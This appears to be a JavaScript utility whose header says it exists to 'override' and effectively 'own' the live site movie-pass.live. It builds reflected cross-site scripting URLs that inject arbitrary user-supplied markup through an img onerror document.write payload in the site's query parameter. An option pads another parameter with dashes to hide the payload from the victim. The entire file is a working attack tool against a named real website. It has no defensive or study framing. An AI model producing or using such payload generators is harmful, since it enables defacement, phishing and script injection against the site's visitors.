/*
program.js by luphoria
luphoria.github.io

Designed to create URLS that will override movie-pass.live, allowing you to basically own the domain name.
*/

function convert(original) {
    var a = original.replace('"', '\"');
    var b = a.replace("'", "\'");
    var c = encodeURI(b);
    console.log("Encoded input: " + c);
    inputModified = c;
    return "function convert performed!";
}

function generate(binput,cidHide) {
        if(cidHide == true) {
            cidHideModified = "--------------------------------------------------------------------------------";
        }
        else {
            cidHideModified = "";
        }
    convert(binput);
    var baseURL = "https://movie-pass.live/su/?s=xss&cid=" + cidHideModified + "&q=%3Cimg+src+onerror%3D%22document.write(`" + inputModified + "`)%22%3E%3C%2Fimg%3E&a=3&img=";
        if (baseURL.length > 2000) {
            if ("https://movie-pass.live/su/?s=xss&cid=&q=%3Cimg+src+onerror%3D%22document.write(`" + inputModified + "`)%22%3E%3C%2Fimg%3E&a=3&img=".length < 2000) { //checks length of baseURL without cidHide on.
                alert("URL too long! Try removing cid hide.");
            }
            else {
                alert("Too much code! Try instead referencing a URL with this code in it.");
            }
        }
        else {
            alert("URL generated!\nGenerated url: \n\n\b" + baseURL)
        }
    return "function generate performed!";
}
